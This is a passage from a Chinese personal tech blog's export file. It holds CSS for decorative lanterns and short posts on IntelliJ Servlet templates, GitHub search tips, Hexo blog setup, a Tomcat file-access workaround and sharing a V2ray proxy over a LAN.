class="hljs-attr">class</span>=<span class="hljs-string">"shui shui-a"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui-c"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui-b"</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-box1"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"xian"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-a"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-b"</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-t"</span>&gt;</span>乐<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui shui-a"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui-c"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui-b"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-box"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"xian"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-a"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-b"</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-t"</span>&gt;</span>快<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui shui-a"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui-c"</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui-b"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="css"><br>    <span class="hljs-selector-class">.deng-box</span> &#123;<br>        <span class="hljs-attribute">position</span>: fixed;<br>        <span class="hljs-attribute">top</span>: -<span class="hljs-number">40px</span>;<br>        <span class="hljs-attribute">right</span>: <span class="hljs-number">150px</span>;<br>        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">9999</span>;<br>        <span class="hljs-attribute">pointer-events</span>: none;<br>    &#125;<br><br>    <span class="hljs-selector-class">.deng-box1</span> &#123;<br>        <span class="hljs-attribute">position</span>: fixed;<br>        <span class="hljs-attribute">top</span>: -<span class="hljs-number">30px</span>;<br>        <span class="hljs-attribute">right</span>: <span class="hljs-number">10px</span>;<br>        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">9999</span>;<br>        <span class="hljs-attribute">pointer-events</span>: none<br>    &#125;<br><br>    <span class="hljs-selector-class">.deng-box2</span> &#123;<br>        <span class="hljs-attribute">position</span>: fixed;<br>        <span class="hljs-attribute">top</span>: -<span class="hljs-number">40px</span>;<br>        <span class="hljs-attribute">left</span>: <span class="hljs-number">150px</span>;<br>        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">9999</span>;<br>        <span class="hljs-attribute">pointer-events</span>: none<br>    &#125;<br><br>    <span class="hljs-selector-class">.deng-box3</span> &#123;<br>        <span class="hljs-attribute">position</span>: fixed;<br>        <span class="hljs-attribute">top</span>: -<span class="hljs-number">30px</span>;<br>        <span class="hljs-attribute">left</span>: <span class="hljs-number">10px</span>;<br>        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">9999</span>;<br>        <span class="hljs-attribute">pointer-events</span>: none<br>    &#125;<br><br>    <span class="hljs-selector-class">.deng-box1</span> <span class="hljs-selector-class">.deng</span>,<br>    <span class="hljs-selector-class">.deng-box3</span> <span class="hljs-selector-class">.deng</span> &#123;<br>        <span class="hljs-attribute">position</span>: relative;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">120px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">90px</span>;<br>        <span class="hljs-attribute">margin</span>: <span class="hljs-number">50px</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-number">#d8000f</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">216</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, .<span class="hljs-number">8</span>);<br>        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span> <span class="hljs-number">50%</span>;<br>        <span class="hljs-attribute">-webkit-transform-origin</span>: <span class="hljs-number">50%</span> -<span class="hljs-number">100px</span>;<br>        <span class="hljs-attribute">-webkit-animation</span>: swing <span class="hljs-number">5s</span> infinite ease-in-out;<br>        <span class="hljs-attribute">box-shadow</span>: -<span class="hljs-number">5px</span> <span class="hljs-number">5px</span> <span class="hljs-number">30px</span> <span class="hljs-number">4px</span> <span class="hljs-number">#fc903d</span><br>    &#125;<br><br>    <span class="hljs-selector-class">.deng</span> &#123;<br>        <span class="hljs-attribute">position</span>: relative;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">120px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">90px</span>;<br>        <span class="hljs-attribute">margin</span>: <span class="hljs-number">50px</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-number">#d8000f</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">216</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, .<span class="hljs-number">8</span>);<br>        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span> <span class="hljs-number">50%</span>;<br>        <span class="hljs-attribute">-webkit-transform-origin</span>: <span class="hljs-number">50%</span> -<span class="hljs-number">100px</span>;<br>        <span class="hljs-attribute">-webkit-animation</span>: swing <span class="hljs-number">3s</span> infinite ease-in-out;<br>        <span class="hljs-attribute">box-shadow</span>: -<span class="hljs-number">5px</span> <span class="hljs-number">5px</span> <span class="hljs-number">50px</span> <span class="hljs-number">4px</span> <span class="hljs-number">#fa6c00</span><br>    &#125;<br><br>    <span class="hljs-selector-class">.deng-a</span> &#123;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">90px</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-number">#d8000f</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">216</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, .<span class="hljs-number">1</span>);<br>        <span class="hljs-attribute">margin</span>: <span class="hljs-number">12px</span> <span class="hljs-number">8px</span> <span class="hljs-number">8px</span> <span class="hljs-number">8px</span>;<br>        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span> <span class="hljs-number">50%</span>;<br>        <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-number">#dc8f03</span><br>    &#125;<br><br>    <span class="hljs-selector-class">.deng-b</span> &#123;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">45px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">90px</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-number">#d8000f</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">216</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, .<span class="hljs-number">1</span>);<br>        <span class="hljs-attribute">margin</span>: -<span class="hljs-number">4px</span> <span class="hljs-number">8px</span> <span class="hljs-number">8px</span> <span class="hljs-number">26px</span>;<br>        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span> <span class="hljs-number">50%</span>;<br>        <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-number">#dc8f03</span><br>    &#125;<br><br>    <span class="hljs-selector-class">.xian</span> &#123;<br>        <span class="hljs-attribute">position</span>: absolute;<br>        <span class="hljs-attribute">top</span>: -<span class="hljs-number">20px</span>;<br>        <span class="hljs-attribute">left</span>: <span class="hljs-number">60px</span>;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">2px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">20px</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-number">#dc8f03</span><br>    &#125;<br><br>    <span class="hljs-selector-class">.shui-a</span> &#123;<br>        <span class="hljs-attribute">position</span>: relative;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">5px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">20px</span>;<br>        <span class="hljs-attribute">margin</span>: -<span class="hljs-number">5px</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">59px</span>;<br>        <span class="hljs-attribute">-webkit-animation</span>: swing <span class="hljs-number">4s</span> infinite ease-in-out;<br>        <span class="hljs-attribute">-webkit-transform-origin</span>: <span class="hljs-number">50%</span> -<span class="hljs-number">45px</span>;<br>        <span class="hljs-attribute">background</span>: orange;<br>        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5px</span> <span class="hljs-number">5px</span><br>    &#125;<br><br>    <span class="hljs-selector-class">.shui-b</span> &#123;<br>        <span class="hljs-attribute">position</span>: absolute;<br>        <span class="hljs-attribute">top</span>: <span class="hljs-number">14px</span>;<br>        <span class="hljs-attribute">left</span>: -<span class="hljs-number">2px</span>;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">10px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">10px</span>;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-number">#dc8f03</span>;<br>        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span><br>    &#125;<br><br>    <span class="hljs-selector-class">.shui-c</span> &#123;<br>        <span class="hljs-attribute">position</span>: absolute;<br>        <span class="hljs-attribute">top</span>: <span class="hljs-number">18px</span>;<br>        <span class="hljs-attribute">left</span>: -<span class="hljs-number">2px</span>;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">10px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">35px</span>;<br>        <span class="hljs-attribute">background</span>: orange;<br>        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5px</span><br>    &#125;<br><br>    <span class="hljs-selector-class">.deng</span><span class="hljs-selector-pseudo">:before</span> &#123;<br>        <span class="hljs-attribute">position</span>: absolute;<br>        <span class="hljs-attribute">top</span>: -<span class="hljs-number">7px</span>;<br>        <span class="hljs-attribute">left</span>: <span class="hljs-number">29px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">12px</span>;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">60px</span>;<br>        <span class="hljs-attribute">content</span>: <span class="hljs-string">" "</span>;<br>        <span class="hljs-attribute">display</span>: block;<br>        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">999</span>;<br>        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span> <span class="hljs-number">5px</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-attribute">border</span>: solid <span class="hljs-number">1px</span> <span class="hljs-number">#dc8f03</span>;<br>        <span class="hljs-attribute">background</span>: orange;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to right, #dc8f03, orange, #dc8f03, orange, #dc8f03)<br>    &#125;<br><br>    <span class="hljs-selector-class">.deng</span><span class="hljs-selector-pseudo">:after</span> &#123;<br>        <span class="hljs-attribute">position</span>: absolute;<br>        <span class="hljs-attribute">bottom</span>: -<span class="hljs-number">7px</span>;<br>        <span class="hljs-attribute">left</span>: <span class="hljs-number">10px</span>;<br>        <span class="hljs-attribute">height</span>: <span class="hljs-number">12px</span>;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">60px</span>;<br>        <span class="hljs-attribute">content</span>: <span class="hljs-string">" "</span>;<br>        <span class="hljs-attribute">display</span>: block;<br>        <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">20px</span>;<br>        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">5px</span> <span class="hljs-number">5px</span>;<br>        <span class="hljs-attribute">border</span>: solid <span class="hljs-number">1px</span> <span class="hljs-number">#dc8f03</span>;<br>        <span class="hljs-attribute">background</span>: orange;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to right, #dc8f03, orange, #dc8f03, orange, #dc8f03)<br>    &#125;<br><br>    <span class="hljs-selector-class">.deng-t</span> &#123;<br>        <span class="hljs-attribute">font-family</span>: 黑体, Arial, Lucida Grande, Tahoma, sans-serif;<br>        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">3.2rem</span>;<br>        <span class="hljs-attribute">color</span>: <span class="hljs-number">#dc8f03</span>;<br>        <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">700</span>;<br>        <span class="hljs-attribute">line-height</span>: <span class="hljs-number">85px</span>;<br>        <span class="hljs-attribute">text-align</span>: center<br>    &#125;<br><br>    <span class="hljs-selector-class">.night</span> <span class="hljs-selector-class">.deng-box</span>,<br>    <span class="hljs-selector-class">.night</span> <span class="hljs-selector-class">.deng-box1</span>,<br>    <span class="hljs-selector-class">.night</span> <span class="hljs-selector-class">.deng-t</span> &#123;<br>        <span class="hljs-attribute">background</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-meta">!important</span><br>    &#125;<br><br>    <span class="hljs-keyword">@-moz-keyframes</span> swing &#123;<br>        0% &#123;<br>            <span class="hljs-attribute">-moz-transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">10deg</span>)<br>        &#125;<br><br>        50% &#123;<br>            <span class="hljs-attribute">-moz-transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">10deg</span>)<br>        &#125;<br><br>        100% &#123;<br>            <span class="hljs-attribute">-moz-transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">10deg</span>)<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">@-webkit-keyframes</span> swing &#123;<br>        0% &#123;<br>            <span class="hljs-attribute">-webkit-transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">10deg</span>)<br>        &#125;<br><br>        50% &#123;<br>            <span class="hljs-attribute">-webkit-transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">10deg</span>)<br>        &#125;<br><br>        100% &#123;<br>            <span class="hljs-attribute">-webkit-transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">10deg</span>)<br>        &#125;<br>    &#125;<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></code></pre></div></td></tr></table></figure>


<p><img src="https://qiniuyun.fxhstudy.com/%E5%A5%BD%E7%94%A8%E7%9A%84JS%E4%BB%A3%E7%A0%811.png" srcset="/img/loading.gif" alt="效果图"></p>
<h2 id="LinkCard"><a href="#LinkCard" class="headerlink" title="LinkCard"></a>LinkCard</h2><p class="note note-success">
    放入head文件中即可LinkCard<br>
    < script src="https://cdn.jsdelivr.net/gh/Sanarous/files@1.13/js/linkcard.js"> < /script>  <br>
</p>

<p>用的时候需要加上以下代码</p>
<p class="note note-success">
    < a href="https://fxhstudy.com" class="LinkCard">工具人小方< /a>
</p>

<p>效果如下</p>
<p><a href="https://fxhstudy.com" class="LinkCard">工具人小方</a></p>
<br>
<br>
<br>

<p style="font-size: 20px">持续更新中...</p>]]></content>
  </entry>
  <entry>
    <title>如何修改Servlet模板</title>
    <url>/article/b1b6990c.html</url>
    <content><![CDATA[<p>这里记录一下这个</p>
<p>Settings中搜索code Templates,找到File and Code Templates</p>
<img src="https://qiniuyun.fxhstudy.com/%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9Servlet%E6%A8%A1%E6%9D%BF1.png" srcset="/img/loading.gif">

<br>
<br>
然后找到Web->Java code templates->Servlet Annotated Class.java
<br>
<br>

<img src="https://qiniuyun.fxhstudy.com/%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9Servlet%E6%A8%A1%E6%9D%BF2.png" srcset="/img/loading.gif">

<br>
<br>

<p>这里我将doPost方法改一下，这样就可以再次创建Servlet文件时，会方便很多。</p>
<br>

<img src="https://qiniuyun.fxhstudy.com/%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9Servlet%E6%A8%A1%E6%9D%BF3.png" srcset="/img/loading.gif">]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在Github中精准搜索以及几个实用网站</title>
    <url>/article/8d187994.html</url>
    <content><![CDATA[<p>只有真正接触使用了Github，你才知道，其实他真的是一座宝藏，你可以在其中发现很多有趣的东西，不仅仅是程序员的一些项目。<br>这里记录一些Github精准搜索的一些技巧，便于查找和学习</p>
<h3 id="精准查找"><a href="#精准查找" class="headerlink" title="精准查找"></a>精准查找</h3><h4 id="1-收藏量-Stars"><a href="#1-收藏量-Stars" class="headerlink" title="1. 收藏量-Stars:"></a>1. 收藏量-Stars:</h4><p class="note note-primary">例：输入<b> start:>=500 </b>,意为匹配收藏数量超过500的项目;</p>

<h4 id="2-复刻量-forks"><a href="#2-复刻量-forks" class="headerlink" title="2. 复刻量-forks:"></a>2. 复刻量-forks:</h4><p class="note note-primary">例：输入<b> forks:>=500 </b>,意为匹配复刻数量超过500的项目;</p>

<h4 id="3-关注者-followers"><a href="#3-关注者-followers" class="headerlink" title="3. 关注者-followers:"></a>3. 关注者-followers:</h4><p class="note note-primary">例：输入<b> followers:>=500 </b>,意为匹配关注者数量超过500的项目;</p>

<h4 id="4-计算机语言-language"><a href="#4-计算机语言-language" class="headerlink" title="4. 计算机语言-language:"></a>4. 计算机语言-language:</h4><p class="note note-primary">例：输入<b> language:Python </b>,意为匹配用Python语言完成的项目;</p>

<h4 id="5-地域-location"><a href="#5-地域-location" class="headerlink" title="5. 地域-location:"></a>5. 地域-location:</h4><p class="note note-primary">例：输入<b> location:china </b>,意为匹配地址在China的用户;</p>

<h4 id="6-姓名搜索-in-fullname"><a href="#6-姓名搜索-in-fullname" class="headerlink" title="6. 姓名搜索-in:fullname"></a>6. 姓名搜索-in:fullname</h4><p class="note note-primary">例：输入<b> Ben in:fullname </b>,意为搜索名字里包含Ben的开发者;</p>


<p>以上就是在Github中搜索可以采取的精准搜索方式，对于我这样的新手来说还是很有帮助的。我认为善于自己寻找资源也是我们从事这一行所必须掌握的技能。</p>
<h3 id="实用网站"><a href="#实用网站" class="headerlink" title="实用网站"></a>实用网站</h3><h4 id="1-表情包的博物馆-Github最有毒的仓库-中国表情包大集合-聚欢乐"><a href="#1-表情包的博物馆-Github最有毒的仓库-中国表情包大集合-聚欢乐" class="headerlink" title="1.表情包的博物馆, Github最有毒的仓库, 中国表情包大集合, 聚欢乐~"></a>1.表情包的博物馆, Github最有毒的仓库, 中国表情包大集合, 聚欢乐~</h4><p><a href="https://github.com/zhaoolee/ChineseBQB" target="_blank" rel="noopener">https://github.com/zhaoolee/ChineseBQB</a></p>
<p>在这你能找到很多表情包，如果你对收集表情包有兴趣可以康一康。</p>
<h4 id="2-🌈谷粒-Chrome插件英雄榜"><a href="#2-🌈谷粒-Chrome插件英雄榜" class="headerlink" title="2.🌈谷粒-Chrome插件英雄榜"></a>2.🌈谷粒-Chrome插件英雄榜</h4><p><a href="https://github.com/zhaoolee/ChromeAppHeroes" target="_blank" rel="noopener">https://github.com/zhaoolee/ChromeAppHeroes</a></p>
<p>91款Chrome插件(目前为止，还在持续更新)，真的巨有用!如果你使用的是Chrome浏览器，强烈安利，真的很多插件巨有用。</p>
<h4 id="3-Bilibili-公开课目录"><a href="#3-Bilibili-公开课目录" class="headerlink" title="3.Bilibili 公开课目录"></a>3.Bilibili 公开课目录</h4><p><a href="https://github.com/elder-frog/OpenCourseCatalog" target="_blank" rel="noopener">https://github.com/elder-frog/OpenCourseCatalog</a></p>
<p>多的不说，这个真的封神了，这是一份公开课的目录，这里的视频大多来自 YouTube 等国内无法访问的网站，为了方便国内的朋友观看，作者将这些视频搬运到了 Bilibili。这个真的很厉害了，很多名校的课都可以看到，包括剑桥、麻省理工、斯坦福。。。</p>
]]></content>
      <tags>
        <tag>小技巧</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建属于自己的静态博客</title>
    <url>/article/83307d05.html</url>
    <content><![CDATA[<h1>基于Windows下的搭建hexo框架博客</h1>

<p>博客这个东西对于我们从事IT行业的人来说其实很重要的，不管是以后出去面试，还是学校招聘都是很加分的，所以决定搭建一个，记录一下我的生活和学习。<br>第一次搭建静态博客，动态博客之前我也搭建过的，相比之下，我觉得静态博客会更好操作一点，毕竟动态博客还要买服务器，备案啥的，很不方便。<br>但如果你喜欢多折腾的话，动态博客也是可以的。下面记录一下我的“第一次”，想想还有有点小羞涩。</p>
<a id="more"></a>
<body>
<h2>1、安装Node.js</h2>
去这里安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener"> Node.js</a>

<p>简单的说 Node.js 就是运行在服务端的 JavaScript。<br>Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。<br>Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。</p>
<p>Node.js是搭建静态博客必须要用的</p>
<h2>2、安装博客框架</h2>
首先需要借助npm包管理器来安装，但国内的镜像源速度很慢，所以这里我们利用npm来安装cnpm(淘宝的那个源)

<p>win+R，搜索cmd，以管理员身份运行下面代码</p>
<blockquote>
    npm install -g cnpm --registry=https://registry.npm.taobao.org
</blockquote>

<p>安装完了以后接着安装hexo博客框架</p>
<blockquote>
    cnpm install -g hexo-cli
</blockquote>

<p>安装完了以后</p>
<blockquote>hexo -v</blockquote>
来查看hexo的信息<br />

<p>接着建立一个文件夹，<code>mkdir blog</code><br>在文件夹里面利用hexo来建立博客<code>hexo init</code>(初始化一个博客)<br>这里你可能会出现一系列问题：</p>
<blockquote>
    1、Git没有安装好或者配置好，尤其是username和email；<br />
    2、安装好了，环境变量没有配置；
</blockquote>

<p>这些其实网上都能查得到的，不要觉得烦，不耐烦说明你就不适合这个</p>
<h2 id="3、操作"><a href="#3、操作" class="headerlink" title="3、操作"></a>3、操作</h2><h5>3-1如何启动博客</h5>
打开Git CMD ，输入<code> hexo s </code>启动博客
在你的浏览器url栏里面输入<code> http://localhost:4000 </code>就可以看到你的博客了<br />
<img src="https://qiniuyun.fxhstudy.com/QQ%E6%88%AA%E5%9B%BE20200229153335.png" srcset="/img/loading.gif"  alt="1" />


<h5>3-2如何写博客</h5>

<p>先CTRL+C断掉连接<br>在命令行里面输入<code> hexo n "我的第一篇博客文章" </code>创建一个新的博文<br>Windows下在你的<code> blog\source_posts </code>文件中就可以发现这篇博文<br>你可以用Sublime这个工具打开，我用起来也是很顺手的，当然md文件建议用Typora来打开<br>然后就可以自己操作了，这个就懂得都懂了<br>这是一个案例：<br><img src="https://qiniuyun.fxhstudy.com/QQ%E6%88%AA%E5%9B%BE20200229155955.png" srcset="/img/loading.gif"  alt="1" /></p>
</body>

<hr>
<p>希望这些对你能有所帮助</p>
<p>（全文完）</p>
<br>
<br>

<br>
<br>
<br>
<br>
<br>
<br>]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>起点</tag>
      </tags>
  </entry>
  <entry>
    <title>如何解决Tomcat无法访问webapps文件夹下的文件</title>
    <url>/article/ad4714aa.html</url>
    <content><![CDATA[<p>这个我真的要说一下了，真的花了我一个多小时，<br>问题描述一下，用IDEA开启Tomcat时，发现不论怎么操作，都不能打开指定文件夹里面的文件，多次访问都是404。<br>查了很多很多资料，试了很多种方法，都不行。<br>然后就很烦，想了想是不是应该将文件放到resources文件夹中去，没想到成功了。于是我想是不是因为缓存问题，导致没有访问出来的原因，(当然这个是不可能的)或者其他原因。<br>之后做了很多次的测试，发现确实需要将要访问的文件添加到resources文件夹中去。重启Tomcat,这样才能够访问到。</p>
<p>但是当你将需要访问的文件放入resources文件中，但删除了webapp文件下的文件，这也是不能访问的。所以需要同时满足webapp下有文件，resources文件夹下也需要有文件。</p>
<p>同时我发现，将当webapp和resources文件下同时存在需要访问的文件时，重启Tomcat，此时再关闭Tomcat，删除resources文件夹下的文件，再开启，访问文件时，还是可以访问的。</p>
<p>这可能和Tomcat的部署有关系。原理我还没有弄明白，但知道了解决方法。<br>还是知识点不够，之后掌握里面的原理后，再来补充。</p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>如何通过局域网共享V2ray</title>
    <url>/article/3d23553a.html</url>
    <content><![CDATA[<p>科学上网一直是一件秘密而又被我们所熟知的一件事，而V2ray又是被大家所喜爱的一款科学上网的工具<br>写这篇文章主要是多此一举，你说都有节点了，为什么还要通过局域网来共享呢？我看网上好像有在switch上通过代理来下游戏的，<br>这个倒是可以的，不过我感觉直接买卡的话，会更好一点，相当年，半夜偷偷玩塞尔达的时光，唉</p>
<a id="more"></a>
<hr>
<p>通过电脑共享其实原理就是将电脑当成主机来使用，下面介绍一下</p>
<p>第一步<br>开启V2ray客户端，在参数设置中打开允许来自局域网的连接，并且记住本地监听端口，一般为10808<br><img src="https://qiniuyun.fxhstudy.com/v2%E5%B1%80%E5%9F%9F%E7%BD%91.png" srcset="/img/loading.gif" alt="" /><br><img src="https://qiniuyun.fxhstudy.com/v2%E7%AB%AF%E5%8F%A3.png" srcset="/img/loading.gif" alt="" /></p>
<p>第二步<br>打开cmd，输入ipconfig，查看IP，记住自己的IP<br><img src="https://qiniuyun.fxhstudy.com/ip%E5%9C%B0%E5%9D%80.png" srcset="/img/loading.gif" alt="" /></p>
<p>第三步<br>手机连WiFi与电脑处于同一局域网下（即同一WiFi下），该代理为手动，在主机名那里输入上面我们查看的IP，端口号为10809（这里我连接10809才能连的上）<br><img src="https://qiniuyun.fxhstudy.com/%E4%BB%A3%E7%90%86.jpg" srcset="/img/loading.gif" alt="" /></p>
<p>第四步<br>打开YouTube测试是否能科学上网了<br><img src="https://qiniuyun.fxhstudy.com/%E6%88%90%E5%8A%9F.jpg" srcset="/img/loading.gif" alt="" /><br><br><br>成功</p>
<hr>
<p>不过我感觉这个是真的捞啊，三点不好，一需要你节点够好可以正常上网，二电脑要保持开机状态，三好像打开不了YouTubeapp<br>以后还是在家弄个软路由好一些。</p>
]]></content>
  </entry>
